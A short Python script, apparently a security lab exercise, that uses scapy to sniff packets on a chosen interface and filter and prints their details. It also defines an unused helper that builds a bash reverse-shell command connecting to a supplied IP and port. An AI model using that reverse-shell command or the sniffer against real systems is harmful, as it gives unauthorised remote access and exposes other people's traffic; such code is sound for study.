# sniffing file. activate this file for sniffing
from scapy.all import *
import sys


def print_packet(pkt):
    print("Sniffed packet: " + pkt['IP'].src + " to " + pkt['IP'].dst)
    pkt.show()


# sniffing packet based on filter
def sniff_packet_filter(interface, filter_statement):
    packets = sniff(iface=interface, filter=filter_statement, prn=print_packet)


def reverse_shell_gen(ip, port):
    cmd = ""
    cmd = f"/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1"

    return cmd

if len(sys.argv) >= 2:
    sniff_packet_filter(sys.argv[1], sys.argv[2])
